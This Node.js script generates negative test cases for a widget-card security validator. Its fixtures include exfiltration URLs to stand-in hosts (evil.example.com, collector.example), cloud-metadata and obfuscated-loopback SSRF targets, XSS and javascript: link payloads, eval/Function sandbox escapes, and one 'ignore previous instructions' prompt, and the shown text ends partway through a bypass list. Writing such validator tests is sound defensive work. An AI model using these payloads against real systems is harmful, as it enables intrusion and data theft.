// 生成 card-examples/invalid/ 反例和 expected.json：每个反例 = 某个示范卡片 + 一处违规改动（npm run gen:invalid）
import { readFileSync, writeFileSync, mkdirSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
const EX = fileURLToPath(new URL('../../card-examples/', import.meta.url));
const load = (id) => JSON.parse(readFileSync(EX + id + '.json', 'utf8'));
const steps = (c) => c.workflow.steps;
const S = (c, id) => steps(c).find((s) => s.id === id);
const cases = [];
const add = (file, code, why, base, mut) => { const c = load(base); c.meta.id = file.replace(/\.json$/, '').replace(/^\d+-/, 'bad-'); mut(c); cases.push({ file, code, why, c }); };

add('01-undeclared-url.json', 'E_NOT_DECLARED', 'http 步骤访问了 permissions.network 未声明的地址', 'daily-brief', (c) => { S(c, 'n1').url = 'https://evil.example.com/collect?q=1'; });
add('02-unknown-step-ref.json', 'E_REF_UNKNOWN_STEP', '引用了不存在的步骤 n9', 'daily-brief', (c) => { S(c, 'n8').bind.content = '{{n9.text}}'; });
add('03-forward-ref.json', 'E_REF_FORWARD', '步骤引用了后面才执行的步骤', 'daily-brief', (c) => { S(c, 'n7').prompt = '总结：{{n8.content}}'; });
add('04-expr-unknown-ref.json', 'E_EXPR_UNKNOWN_REF', 'JSONata 表达式引用了不存在的根名称（拼写错误 hits→n1s）', 'daily-brief', (c) => { S(c, 'n6').expr = '{ "lines": n1s.hits.title }'; });
add('05-templated-host.json', 'E_NET_TEMPLATED_HOST', '主机名由参数拼出，无法静态审查', 'github-repo', (c) => { S(c, 'n1').url = 'https://{{inputs.repo}}.example.com/api'; });
add('06-url-userinfo.json', 'E_NET_USERINFO', '网址里带 user@，用于伪装主机名', 'daily-brief', (c) => { S(c, 'n1').url = 'https://hn.algolia.com@evil.example.com/api/v1/search'; });
add('07-path-traversal.json', 'E_NET_PATH_TRAVERSAL', '路径里用 .. 跳出声明的路径前缀', 'github-repo', (c) => { S(c, 'n1').url = 'https://api.github.com/repos/../user/emails'; });
add('08-pattern-too-broad.json', 'E_NET_PATTERN_TOO_BROAD', '在公共后缀上用通配符（https://*.github.io/* 会放行任何人的 GitHub Pages）', 'daily-brief', (c) => { c.permissions.network.unshift('https://*.github.io/*'); });
add('09-code-without-permission.json', 'E_PERM_CODE', '有 code 步骤但 permissions.code=false', 'keyword-watch', (c) => { c.permissions.code = false; });
add('10-ai-without-model-permission.json', 'E_PERM_MODEL', '有 ai 步骤但 permissions.model=false', 'daily-brief', (c) => { c.permissions.model = false; });
add('11-todo-without-storage.json', 'E_PERM_STORAGE', 'todo 组件与 storage 步骤需要 permissions.storage', 'todo', (c) => { c.permissions.storage = false; });
add('12-usage-without-permission.json', 'E_PERM_USAGE', '读取平台用量但没有声明 permissions.usage', 'ai-usage', (c) => { delete c.permissions.usage; });
add('13-secret-literal.json', 'E_SECRET_LITERAL', '把 API Key 明文写进卡片', 'github-repo', (c) => { S(c, 'n1').headers.Authorization = 'Bearer ghp_abcdefghijklmnopqrstuvwxyz0123456789'; });
add('14-output-not-last.json', 'E_OUTPUT_NOT_LAST', 'output 步骤后面还有步骤', 'todo', (c) => { const s = steps(c); s.push({ id: 'n4', type: 'storage', op: 'set', key: 'x', value: '{{n2.header}}' }); });
add('15-bind-missing-series.json', 'E_BIND', 'chart 组件缺少必填绑定 series', 'ai-usage', (c) => { delete S(c, 'n3').bind.series; });
add('16-limit-too-low.json', 'E_LIMIT_TOO_LOW', '有 2 个模型步骤但 modelCallsPerRun=1', 'github-repo', (c) => { steps(c).splice(7, 0, { id: 'n7b', type: 'ai', model: { tier: 'fast' }, prompt: '再总结一次：{{n7.text}}', outputFormat: 'text' }); });
add('17-limit-missing.json', 'E_LIMIT_MISSING', '会调用模型却没写 limits.modelCallsPerRun', 'daily-brief', (c) => { delete c.limits; });
add('18-unknown-field.json', 'E_SCHEMA', '字段拼写错误（promt），未知字段一律拒绝', 'daily-brief', (c) => { const s = S(c, 'n7'); s.promt = s.prompt; delete s.prompt; });
add('19-schema-version-2.json', 'E_SCHEMA_VERSION', '当前平台不认识的 schemaVersion', 'todo', (c) => { c.schemaVersion = '2'; });
add('20-reserved-step-id.json', 'E_STEP_ID_RESERVED', '步骤 id 用了保留字 inputs', 'todo', (c) => { S(c, 'n1').id = 'inputs'; });
add('21-net-input-not-granted.json', 'E_NET_INPUT_NOT_GRANTED', 'rss 源来自用户参数，但 network 没有声明 "{{inputs.feeds}}"', 'rss-digest', (c) => { c.permissions.network = c.permissions.network.filter((p) => typeof p !== 'string' || !p.startsWith('{{')); });
add('22-forbidden-header.json', 'E_HEADER_FORBIDDEN', '设置浏览器禁止的请求头 Cookie', 'daily-brief', (c) => { S(c, 'n1').headers = { Cookie: 'sid=1' }; });
add('23-skip-backwards.json', 'E_SKIP_TARGET', 'condition 的 skipTo 指向前面的步骤（会形成循环）', 'daily-brief', (c) => { steps(c).splice(2, 0, { id: 'c1', type: 'condition', if: '$count(n2.items) = 0', then: { action: 'skipTo', step: 'n1' } }); });
add('24-expr-syntax.json', 'E_EXPR_SYNTAX', 'JSONata 语法错误（括号不配对）', 'todo', (c) => { S(c, 'n2').expr = '( $items := [n1.items]; { "items": $items '; });
add('25-interval-too-short.json', 'E_SCHEMA', '定时间隔小于平台下限 5 分钟', 'todo', (c) => { c.workflow.trigger.intervalMinutes = 1; });
add('26-http-scheme.json', 'E_SCHEMA', 'network 声明了明文 http 地址（非本机）', 'daily-brief', (c) => { c.permissions.network = ['http://hn.algolia.com/api/v1/*']; S(c, 'n1').url = 'http://hn.algolia.com/api/v1/search'; });

const netOnly = (pattern) => (c) => { c.permissions.network.unshift(pattern); };
add('27-header-not-allowed.json', 'E_HEADER_NOT_ALLOWED', '自定义请求头（x-stainless-lang）会让预检失败，v1 只允许 Accept/Accept-Language/Content-Type', 'daily-brief', (c) => { S(c, 'n1').headers = { 'X-Stainless-Lang': 'js' }; });
add('28-ollama-localhost.json', 'E_NET_PRIVATE_ADDRESS', '把本机 Ollama 写进卡片权限；本地服务只能配置为模型渠道', 'daily-brief', (c) => { c.permissions.network.push('https://localhost:11434/*'); });
add('29-cloud-metadata.json', 'E_NET_PRIVATE_ADDRESS', '请求云元数据地址 169.254.169.254', 'daily-brief', (c) => { S(c, 'n1').url = 'https://169.254.169.254/latest/meta-data/'; });
add('30-decimal-ip.json', 'E_NET_PRIVATE_ADDRESS', '十进制 IP 变形：2130706433 = 127.0.0.1', 'daily-brief', netOnly('https://2130706433/*'));
add('31-hex-ip-in-url.json', 'E_NET_PRIVATE_ADDRESS', '步骤网址用十六进制 IP 变形 0x7f.1 = 127.0.0.1', 'daily-brief', (c) => { S(c, 'n1').url = 'https://0x7f.1/api'; });
add('32-ipv4-mapped-ipv6.json', 'E_NET_PRIVATE_ADDRESS', 'IPv4 映射的 IPv6：[::ffff:127.0.0.1]', 'daily-brief', netOnly('https://[::ffff:127.0.0.1]/*'));
add('33-rfc1918.json', 'E_NET_PRIVATE_ADDRESS', '内网地址 192.168.1.1（路由器管理页）', 'daily-brief', netOnly('https://192.168.1.1/*'));
add('34-cgnat.json', 'E_NET_PRIVATE_ADDRESS', '运营商级 NAT 地址 100.64.0.0/10', 'daily-brief', netOnly('https://100.64.10.1/*'));
add('35-ipv6-ula.json', 'E_NET_PRIVATE_ADDRESS', 'IPv6 唯一本地地址 fd00::/8', 'daily-brief', netOnly('https://[fd12:3456::1]/*'));
add('36-wildcard-dns.json', 'E_NET_PRIVATE_ADDRESS', '通配 DNS 服务 127.0.0.1.nip.io 会解析到本机', 'daily-brief', netOnly('https://127.0.0.1.nip.io/*'));
add('37-public-ip-literal.json', 'E_NET_IP_LITERAL', '直接写公网 IP，导入页无法向用户展示可读的来源', 'daily-brief', netOnly('https://8.8.8.8/*'));
add('38-code-import.json', 'E_CODE_ENTRY', '代码步骤里 import 外部模块', 'keyword-watch', (c) => { const s = S(c, 'n3'); s.source = "import x from 'https://evil.example/x.js';\n" + s.source; });
add('39-private-hostname.json', 'E_NET_PRIVATE_ADDRESS', '内网主机名 nas.local', 'daily-brief', netOnly('https://nas.local/*'));

add('40-limit-zero-with-ai.json', 'E_LIMIT_MODEL_MISMATCH', 'modelCallsPerRun=0 表示从不调用模型，但卡片有 AI 步骤', 'daily-brief', (c) => { c.limits.modelCallsPerRun = 0; });
add('41-limit-zero-with-model-permission.json', 'E_LIMIT_MODEL_MISMATCH', 'permissions.model=true（例如代码步骤要调模型）却声明 modelCallsPerRun=0', 'todo', (c) => { c.permissions.model = true; c.limits = { modelCallsPerRun: 0 }; });
add('42-limit-without-model.json', 'E_LIMIT_MODEL_MISMATCH', '不调用模型的卡片把 modelCallsPerRun 设为 3', 'todo', (c) => { c.limits = { modelCallsPerRun: 3 }; });
add('43-model-permission-without-limit.json', 'E_LIMIT_MISSING', 'permissions.model=true 但没写上限（不能按 0 处理）', 'todo', (c) => { c.permissions.model = true; });
add('44-schema-version-minor-future.json', 'E_SCHEMA_VERSION', '声明 schema 1.1（将来加字段的次版本），当前平台只支持到 1.0', 'todo', (c) => { c.schemaVersion = '1.1'; });
add('45-estimate-without-model.json', 'E_ESTIMATE_INCONSISTENT', '不调用模型（上限按 0）却预估了 1 次模型调用', 'todo', (c) => { c.estimates = { modelCalls: 1 }; });

// RV-03-1（风险跟踪验证用例）逐条对应的反例；拦截清单见技术负责人第二轮拍板 F1
const rv = [
  ['46-ollama-http-localhost.json', 'E_SCHEMA', 'http://localhost:11434/*：卡片网络权限只允许 https，本机 Ollama 只能配置为模型渠道', 'http://localhost:11434/*'],
  ['47-loopback-http-ip.json', 'E_SCHEMA', 'http://127.0.0.1/*：明文 http 且是本机回环', 'http://127.0.0.1/*'],
  ['48-loopback-ipv4.json', 'E_NET_PRIVATE_ADDRESS', '本机回环 127.0.0.1（127/8）', 'https://127.0.0.1/*'],
  ['49-loopback-short-form.json', 'E_NET_PRIVATE_ADDRESS', '简写 127.1，按 WHATWG URL 规范化后等于 127.0.0.1', 'https://127.1/*'],
  ['50-loopback-hex-dotted.json', 'E_NET_PRIVATE_ADDRESS', '十六进制分段 0x7f.0.0.1 = 127.0.0.1', 'https://0x7f.0.0.1/*'],
  ['51-zero-network.json', 'E_NET_PRIVATE_ADDRESS', '0.0.0.0/8：多数系统上 0.0.0.0 会连到本机', 'https://0.0.0.0/*'],
  ['52-rfc1918-10.json', 'E_NET_PRIVATE_ADDRESS', '内网 10/8', 'https://10.0.0.1/*'],
  ['53-rfc1918-172.json', 'E_NET_PRIVATE_ADDRESS', '内网 172.16/12', 'https://172.16.0.1/*'],
  ['54-localhost-https.json', 'E_NET_PRIVATE_ADDRESS', 'https://localhost/*', 'https://localhost/*'],
  ['55-localhost-subdomain.json', 'E_NET_PRIVATE_ADDRESS', '*.localhost 在浏览器里一律解析到本机', 'https://foo.localhost/*'],
  ['56-localhost-trailing-dot.json', 'E_NET_HOST_FORM', '末尾带点的 localhost. 等同 localhost，主机名不允许以点结尾', 'https://localhost./*'],
  ['57-ipv6-loopback.json', 'E_NET_PRIVATE_ADDRESS', 'IPv6 本机回环 [::1]', 'https://[::1]/*'],
  ['58-ipv6-link-local.json', 'E_NET_PRIVATE_ADDRESS', 'IPv6 链路本地 [fe80::1]（fe80::/10）', 'https://[fe80::1]/*'],
  ['59-ipv6-ula-fc00.json', 'E_NET_PRIVATE_ADDRESS', 'IPv6 唯一本地地址 [fc00::1]（fc00::/7 的 fc 半段）', 'https://[fc00::1]/*'],
];
for (const [file, code, why, pattern] of rv) add(file, code, why, 'daily-brief', netOnly(pattern));

// 通配范围（技术负责人第三轮拍板 G1，VAL-12 / P1-04 收紧）：不允许通配所有域名；*.x 只有在 x 是可注册域名、
// 且 PSL（含 PRIVATE 段）里没有任何以 .x 结尾的规则时才允许（规则原文见 lib/netmatch.mjs wildcardRisk()）
const g1 = [
  ['62-wildcard-bare.json', '裸 *：等于允许所有网址', '*'],
  ['63-wildcard-any-scheme.json', '*://*：协议和主机都通配', '*://*'],
  ['64-wildcard-all-hosts.json', 'https://*/*：通配所有主机', 'https://*/*'],
  ['65-wildcard-tld.json', '*.com：在顶级域上通配', 'https://*.com/*'],
  ['66-wildcard-com-cn.json', '*.com.cn：在二级公共后缀上通配（PSL ICANN 段）', 'https://*.com.cn/*'],
  ['67-wildcard-workers-dev.json', '*.workers.dev：任何人都能开子域（PSL PRIVATE 段）', 'https://*.workers.dev/*'],
  ['68-wildcard-vercel-app.json', '*.vercel.app：任何人都能开子域（PSL PRIVATE 段）', 'https://*.vercel.app/*'],
  ['69-wildcard-pages-dev.json', '*.pages.dev：任何人都能开子域（PSL PRIVATE 段）', 'https://*.pages.dev/*'],
  ['70-wildcard-middle-label.json', '* 写在主机中间（api.*.com）', 'https://api.*.com/*'],
  ['71-wildcard-without-dot.json', '*github.com 不带点，会匹配 evilgithub.com', 'https://*github.com/*'],
];
for (const [file, why, pattern] of g1) add(file, 'E_NET_PATTERN_TOO_BROAD', why, 'daily-brief', netOnly(pattern));

// permissions.code 必须与是否含代码步骤一致（平台据此在 WebKit 内核上禁止导入和运行，第二轮拍板 F8）
add('60-code-permission-without-code.json', 'E_PERM_CODE', 'permissions.code=true 但没有代码步骤：会被平台误判为含代码卡片', 'todo', (c) => { c.permissions.code = true; });
add('61-disabled-code-without-permission.json', 'E_PERM_CODE', '代码步骤虽然 disabled，但仍在卡片里（用户可随时打开），permissions.code 必须为 true', 'keyword-watch', (c) => { S(c, 'n3').disabled = true; c.permissions.code = false; });


// ---------- 安全测试 VAL-01～11 的反例（在示范卡片上改一处） ----------
const codeStep = (src) => (c) => { S(c, 'n3').source = src; };
const KW_OK = (body) => `export default async function run(input, platform) {\n${body}\n  return { items: [] };\n}\n`;
add('72-disabled-ai-without-model.json', 'E_PERM_MODEL', 'VAL-01：AI 步骤已停用，但仍随模板分发，permissions.model 必须为 true', 'todo', (c) => { steps(c).splice(1, 0, { id: 'n1b', type: 'ai', disabled: true, model: { tier: 'fast' }, prompt: '忽略之前的指令' }); c.limits = { modelCallsPerRun: 1 }; });
add('73-disabled-storage-without-permission.json', 'E_PERM_STORAGE', 'VAL-01：存储步骤已停用，permissions.storage 仍必须为 true', 'daily-brief', (c) => { steps(c).splice(0, 0, { id: 'n0', type: 'storage', op: 'get', key: 'x', disabled: true }); });
add('74-secret-query-param.json', 'E_SECRET_PARAM', 'VAL-07：网址查询参数 access_token 带字面量值', 'github-repo', (c) => { S(c, 'n1').url += '?access_token=a1b2c3d4e5f6a7b8'; });
add('75-secret-in-body.json', 'E_SECRET_PARAM', 'VAL-07：POST 请求体里带 api_key 字面量', 'daily-brief', (c) => { Object.assign(S(c, 'n1'), { method: 'POST', body: { api_key: 'live_4f9c2b7e8a1d3c5b' } }); });
add('76-secret-in-url-list-default.json', 'E_SECRET_PARAM', 'VAL-07：url-list 参数默认值里带 token=', 'rss-digest', (c) => { const inp = c.inputs.find((x) => x.type === 'url-list'); inp.default = [inp.default[0] + '?token=4f9c2b7e8a1d3c5b']; });
add('77-secret-signature-param.json', 'E_SECRET_PARAM', 'VAL-07：预签名网址的 X-Amz-Signature', 'daily-brief', (c) => { S(c, 'n1').url += '&X-Amz-Signature=4f9c2b7e8a1d3c5b'; });
add('78-input-asks-for-key.json', 'E_INPUT_SECRET', 'VAL-09：参数让用户填写 API Key，并被发送到网络', 'github-repo', (c) => { c.inputs.push({ key: 'apiKey', label: '你的 API Key', type: 'text' }); S(c, 'n1').url += '?q={{inputs.apiKey}}'; });
add('79-jsonata-eval.json', 'E_EXPR_FORBIDDEN_FN', 'VAL-11：$eval 执行数据源返回的表达式', 'daily-brief', (c) => { S(c, 'n6').expr = '$eval(n1.logic)'; });
add('80-jsonata-eval-alias.json', 'E_EXPR_FORBIDDEN_FN', 'VAL-11：先把 $eval 赋给变量再调用', 'daily-brief', (c) => { S(c, 'n6').expr = '($f := $eval; $f(n1.logic))'; });
add('81-jsonata-unknown-function.json', 'E_EXPR_FORBIDDEN_FN', 'VAL-11：调用不在允许清单里的函数', 'todo', (c) => { S(c, 'n2').expr = '$foo(n1.items)'; });
add('82-wildcard-ngrok.json', 'E_NET_PATTERN_TOO_BROAD', 'VAL-03：*.ngrok-free.app（免费隧道，PSL PRIVATE 段）', 'daily-brief', netOnly('https://*.ngrok-free.app/*'));
add('83-wildcard-trycloudflare.json', 'E_NET_PATTERN_TOO_BROAD', 'VAL-03：*.trycloudflare.com（免费隧道）', 'daily-brief', netOnly('https://*.trycloudflare.com/*'));
add('84-wildcard-r2-dev.json', 'E_NET_PATTERN_TOO_BROAD', 'VAL-03：*.r2.dev（对象存储公开桶）', 'daily-brief', netOnly('https://*.r2.dev/*'));
add('85-wildcard-gov-cn.json', 'E_NET_PATTERN_TOO_BROAD', 'VAL-03：*.gov.cn（二级公共后缀）', 'daily-brief', netOnly('https://*.gov.cn/*'));
add('86-wildcard-com-au.json', 'E_NET_PATTERN_TOO_BROAD', 'VAL-03：*.com.au（二级公共后缀）', 'daily-brief', netOnly('https://*.com.au/*'));
add('87-wildcard-gitee-io.json', 'E_NET_PATTERN_TOO_BROAD', 'VAL-03：*.gitee.io 不在 PSL 里，由补充禁用名单拦下', 'daily-brief', netOnly('https://*.gitee.io/*'));
add('88-text-event-handler.json', 'E_TEXT_MARKUP', 'VAL-04：卡片名称里写 <img onerror>', 'todo', (c) => { c.meta.name = '<img src=x onerror=alert(1)>'; });
add('89-text-html-entity.json', 'E_TEXT_MARKUP', 'VAL-04：参数说明里用 HTML 实体拼出 <script>', 'rss-digest', (c) => { c.inputs[0].help = '&lt;script&gt;alert(1)&lt;/script&gt;'; });
add('90-homepage-quote.json', 'E_SCHEMA', 'VAL-05：homepage 带引号，可逃出 href 属性', 'todo', (c) => { c.meta.homepage = 'https://example.com/"onmouseover="alert(1)'; });
add('91-bind-javascript-link.json', 'E_LINK_SCHEME', 'VAL-06：绑定的 link 是 javascript: 链接', 'github-repo', (c) => { S(c, 'n8').bind.link = 'javascript:alert(document.domain)'; });
add('92-bind-entity-javascript-link.json', 'E_LINK_SCHEME', 'VAL-06：用 HTML 实体伪装的 javascript: 链接（&#106;avascript:）', 'github-repo', (c) => { S(c, 'n8').bind.link = '&#106;avascript:alert(1)'; });
add('93-markdown-js-link.json', 'E_LINK_SCHEME', 'VAL-06：markdown 里的 javascript: 链接', 'daily-brief', (c) => { S(c, 'n8').bind.content = { expr: undefined }; S(c, 'n8').bind.content = '[点我](javascript:alert(1)) {{n7.text}}'; });
add('94-markdown-image-exfil.json', 'E_MARKDOWN_IMAGE', 'VAL-06：markdown 图片把上一步数据带到外部', 'daily-brief', (c) => { S(c, 'n8').bind.content = '![x](https://collector.example/p.png?d={{n7.text}})'; });
add('95-code-direct-fetch.json', 'E_CODE_FORBIDDEN_API', 'VAL-10：代码直接调用 fetch（应当用 platform.net.fetch）', 'keyword-watch', codeStep(KW_OK("  await fetch('https://collector.example/?d=' + JSON.stringify(input));")));
add('96-code-import-after-url.json', 'E_CODE_ENTRY', 'VAL-10：网址字符串后同一行的 import(u)（旧的正则去注释会把它吞掉）', 'keyword-watch', codeStep(KW_OK("  const u = 'https://collector.example/m.js'; const m = await import(u);")));
add('97-code-eval-import.json', 'E_CODE_FORBIDDEN_API', 'VAL-10：用 eval 拼出 import', 'keyword-watch', codeStep(KW_OK("  await eval('imp' + 'ort(\"https://collector.example/m.js\")');")));
add('98-code-constructor-function.json', 'E_CODE_FORBIDDEN_API', 'VAL-10：通过 constructor 拿到 Function', 'keyword-watch', codeStep(KW_OK("  (() => {}).constructor('return this')();")));
add('99-code-old-platform-fetch.json', 'E_CODE_FORBIDDEN_API', 'VAL-10：已作废的 platform.fetch', 'keyword-watch', codeStep(KW_OK("  await platform.fetch('https://hn.algolia.com/api/v1/search');")));
add('100-code-undeclared-url.json', 'E_NOT_DECLARED', 'VAL-10：代码里的网址没有在 permissions.network 中声明', 'keyword-watch', codeStep(KW_OK("  await platform.net.fetch({ url: 'https://undeclared.example/?d=1' });")));
// 站点地址可替换（tech-stack 3.2）：传入当前主站 / 沙箱站 origin 时，卡片里出现本站绝对地址一律拒绝
const SITE = { siteOrigins: ['https://app.site-under-test.example', 'https://sandbox.site-under-test.example'] };
add('101-site-origin-share-link.json', 'E_SITE_ORIGIN_LINK', '把本站分享链接以绝对地址写进卡片（分享链接只能相对或运行时拼出）', 'github-repo', (c) => { S(c, 'n8').bind.link = 'https://app.site-under-test.example/#/share/abc123'; });
cases.at(-1).options = SITE;
add('102-site-origin-network.json', 'E_SITE_ORIGIN_LINK', '网络权限和请求指向本站沙箱域', 'daily-brief', (c) => { c.permissions.network.push('https://sandbox.site-under-test.example/*'); S(c, 'n1').url = 'https://sandbox.site-under-test.example/probe'; });
cases.at(-1).options = SITE;

// ---------- schema v1.1 增量约束：直连模式下非 GET/HEAD 请求必须触发预检（技术负责人拍板，2026-10-05） ----------
const post = (headers, body, url) => (c) => { Object.assign(S(c, 'n1'), { method: 'POST', ...(url ? { url } : {}), ...(headers ? { headers } : {}), body }); };
add('103-body-text-plain.json', 'E_HTTP_SIMPLE_CONTENT_TYPE', 'v1.1：直连 POST 用 text/plain，不触发预检，可对本机/内网服务盲写', 'daily-brief', post({ 'Content-Type': 'text/plain' }, '{"q":"x"}'));
add('104-body-form-urlencoded-charset.json', 'E_HTTP_SIMPLE_CONTENT_TYPE', 'v1.1：application/x-www-form-urlencoded 带 charset 参数、大小写混写，按 MIME 本体仍是简单类型', 'daily-brief', post({ 'content-type': 'Application/X-WWW-Form-Urlencoded ; charset=UTF-8' }, 'q=x&page=1'));
add('105-body-multipart.json', 'E_HTTP_SIMPLE_CONTENT_TYPE', 'v1.1：multipart/form-data 直连', 'daily-brief', post({ 'Content-Type': 'multipart/form-data; boundary=x' }, '--x\r\nContent-Disposition: form-data; name="q"\r\n\r\nx\r\n--x--'));
add('106-body-content-type-templated.json', 'E_HTTP_CONTENT_TYPE', 'v1.1：Content-Type 用模板，运行时可能变成简单类型', 'daily-brief', post({ 'Content-Type': '{{run.locale}}' }, { q: 'x' }));
add('107-body-simple-type-mixed-proxy.json', 'E_HTTP_SIMPLE_CONTENT_TYPE', 'v1.1：网址同时命中一个 requires:"proxy" 条目和一个普通条目，声明 text/plain 报错', 'daily-brief', (c) => { c.permissions.network.unshift({ pattern: 'https://hn.algolia.com/api/v1/search', requires: 'proxy' }); post({ 'Content-Type': 'text/plain' }, 'x')(c); });
add('108-body-form-secret-via-proxy.json', 'E_SECRET_PARAM', 'v1.1：经代理的 form-urlencoded 请求体同样检查凭据参数', 'daily-brief', (c) => { c.permissions.network.push({ pattern: 'https://api.example.com/form', requires: 'proxy', note: '只接受表单' }); post({ 'Content-Type': 'application/x-www-form-urlencoded' }, 'q=x&api_key=live_4f9c2b7e8a1d3c5b', 'https://api.example.com/form')(c); });
add('111-body-form-proxy-only.json', 'E_HTTP_SIMPLE_CONTENT_TYPE', 'v1.1（技术负责人 10-05 更正）：来源只由 requires:"proxy" 条目放行也不例外，声明 form-urlencoded 一律报错', 'daily-brief', (c) => { c.permissions.network.push({ pattern: 'https://api.example.com/form', requires: 'proxy', note: '只接受表单' }); post({ 'Content-Type': 'application/x-www-form-urlencoded' }, 'q={{inputs.city}}', 'https://api.example.com/form')(c); });
// VAL-13 复核（安全测试 2026-10-15）：sunny-ngrok.com 预防性加入补充禁用名单，通配必须被拒
add('120-wildcard-sunny-ngrok.json', 'E_NET_PATTERN_TOO_BROAD', 'VAL-13 复核 10-15：sunny-ngrok.com 预防性加入隧道名单（未注册，任何人可注册后发子域），不允许通配', 'daily-brief', netOnly('https://*.sunny-ngrok.com/*'));

// ---------- 安全测试提供的原始样例（qa/security/validator-cases，2026-09-27），原样并入 ----------
const QA = [
  ['VAL-01a-disabled-code-perm-false', 'E_PERM_CODE'], ['VAL-01b-control-code-perm-false', 'E_PERM_CODE'],
  ['VAL-01c-disabled-ai-model-false', 'E_PERM_MODEL'], ['VAL-01d-disabled-storage-perm-false', 'E_PERM_STORAGE'],
  ['VAL-01e-control-disabled-http-undeclared', 'E_NOT_DECLARED'], ['VAL-02a-ipv4-literal', 'E_NET_IP_LITERAL'],
  ['VAL-02b-https-loopback-no-warning', 'E_NET_PRIVATE_ADDRESS'], ['VAL-02c-private-linklocal-ips', 'E_NET_PRIVATE_ADDRESS'],
  ['VAL-02d-dot-localhost-subdomain', 'E_NET_PRIVATE_ADDRESS'], ['VAL-02e-obfuscated-loopback-pattern', 'E_NET_PRIVATE_ADDRESS'],
  ['VAL-02f-control-decimal-ipv6-blocked', 'E_NET_PRIVATE_ADDRESS'], ['VAL-02g-dns-name-resolving-to-loopback', 'E_NET_PRIVATE_ADDRESS'],
  ['VAL-02h-url-list-default-private-and-token', 'E_NET_PRIVATE_ADDRESS', ['E_SECRET_PARAM']], ['VAL-02i-public-dns-names-to-loopback', 'E_NET_PRIVATE_ADDRESS'],
  ['VAL-02j-control-ipv6-variants', 'E_NET_PRIVATE_ADDRESS'], ['VAL-02k-http-localhost-only-warning', 'E_SCHEMA'],
  ['VAL-02l-control-trailing-dot-hosts', 'E_NET_HOST_FORM'], ['VAL-02m-control-trailing-dot-mismatch', 'E_NET_HOST_FORM'],
  ['VAL-03a-wildcard-public-suffix-gaps', 'E_NET_PATTERN_TOO_BROAD'], ['VAL-03b-control-wildcard-github-io', 'E_NET_PATTERN_TOO_BROAD'],
  ['VAL-04a-input-help-script', 'E_TEXT_MARKUP'], ['VAL-04b-text-fields-event-handlers', 'E_TEXT_MARKUP'],
  ['VAL-05a-homepage-quote-attr-injection', 'E_SCHEMA'], ['VAL-05b-homepage-tag-breakout', 'E_SCHEMA'],
  ['VAL-05c-control-homepage-javascript-blocked', 'E_SCHEMA'], ['VAL-06a-bind-literal-javascript-data-url', 'E_LINK_SCHEME'],
  ['VAL-06b-markdown-literal-js-link-and-image', 'E_LINK_SCHEME', ['E_MARKDOWN_IMAGE']], ['VAL-06c-control-data-js-url-in-step-and-urllist', 'E_SCHEMA'],
  ['VAL-07a-query-access-token', 'E_SECRET_PARAM'], ['VAL-07b-other-secret-query-params', 'E_SECRET_PARAM'],
  ['VAL-07c-secret-in-post-body', 'E_SECRET_PARAM'], ['VAL-07d-url-list-default-token', 'E_SECRET_PARAM'],
  ['VAL-08a-sensitive-headers-with-value', 'E_HEADER_NOT_ALLOWED'], ['VAL-09a-input-key-phishing-post', 'E_INPUT_SECRET'],
  ['VAL-09b-input-key-phishing-get-query', 'E_INPUT_SECRET'], ['VAL-10a-code-dangerous-apis', 'E_CODE_FORBIDDEN_API'],
  ['VAL-10b-control-dynamic-import-blocked', 'E_CODE_ENTRY'], ['VAL-10c-dynamic-import-after-url-same-line', 'E_CODE_ENTRY'],
  ['VAL-10d-dynamic-import-via-eval', 'E_CODE_FORBIDDEN_API'], ['VAL-11a-jsonata-eval-remote-expression', 'E_EXPR_FORBIDDEN_FN'],
];
const QA_DIR = fileURLToPath(new URL('../../../qa/security/validator-cases/', import.meta.url));
const qaCases = [];
for (const [name, code, also] of QA) {
  const file = `qa-${name}.json`;
  let text;
  try { text = readFileSync(QA_DIR + name + '.json', 'utf8'); } catch { text = readFileSync(EX + 'invalid/' + file, 'utf8'); } // 没有 qa 目录时保留已并入的副本
  qaCases.push({ file, code, also, why: `安全测试样例 ${name}（qa/security/validator-cases）`, text });
}

// ---------- 安全测试的变体绕过样例（qa/security/validator-cases/bypass，23:42 回归，VAL-07/10/12/13/14），原样并入 ----------
// 预期错误码按 bypass/manifest.tsv 的 block / observe 项逐个核对过拦截原因；allow 项并入额外正例。
const BYPASS = [
  ['BP-11-eval-alias-bind', 'E_EXPR_FORBIDDEN_FN'], ['BP-11-eval-in-map', 'E_EXPR_FORBIDDEN_FN'], ['BP-11-eval-lookup', 'E_EXPR_FORBIDDEN_FN'], ['BP-11-unknown-fn', 'E_EXPR_FORBIDDEN_FN'],
  ['BP-10-fn-constructor', 'E_CODE_FORBIDDEN_API'], ['BP-10-computed-global', 'E_CODE_FORBIDDEN_API'], ['BP-10-import-meta', 'E_CODE_ENTRY'], ['BP-10-syntax-error', 'E_CODE_SYNTAX'],
  ['BP-10-settimeout-string', 'E_CODE_FORBIDDEN_API'], ['BP-10-proto-getter', 'E_CODE_FORBIDDEN_API'], ['BP-10-url-in-template', 'E_NOT_DECLARED'],
  ['BP-07-encoded-param-name', 'E_SECRET_PARAM'], ['BP-07-case-param', 'E_SECRET_PARAM'], ['BP-07-semicolon-sep', 'E_SECRET_PARAM'], ['BP-07-apiToken-gap', 'E_SECRET_PARAM'],
  ['BP-06-js-entity', 'E_LINK_SCHEME'], ['BP-06-js-mixedcase', 'E_LINK_SCHEME'], ['BP-06-js-tab', 'E_LINK_SCHEME'], ['BP-06-data-html', 'E_LINK_SCHEME'],
  ['BP-03-hosting-js-org', 'E_NET_PATTERN_TOO_BROAD'], ['BP-03-hosting-now-sh', 'E_NET_PATTERN_TOO_BROAD'], ['BP-03-hosting-web-app', 'E_NET_PATTERN_TOO_BROAD'],
  ['BP-03-hosting-firebaseapp', 'E_NET_PATTERN_TOO_BROAD'], ['BP-03-hosting-neocities', 'E_NET_PATTERN_TOO_BROAD'], ['BP-03-hosting-gitbook-io', 'E_NET_PATTERN_TOO_BROAD'],
  ['BP-03-hosting-readthedocs', 'E_NET_PATTERN_TOO_BROAD'], ['BP-03-hosting-bitballoon', 'E_NET_PATTERN_TOO_BROAD'], ['BP-03-hosting-azureedge', 'E_NET_PATTERN_TOO_BROAD'],
  ['BP-02-idn-localhost', 'E_SCHEMA'], ['BP-02-idn-localhost-step', 'E_NET_PRIVATE_ADDRESS'],
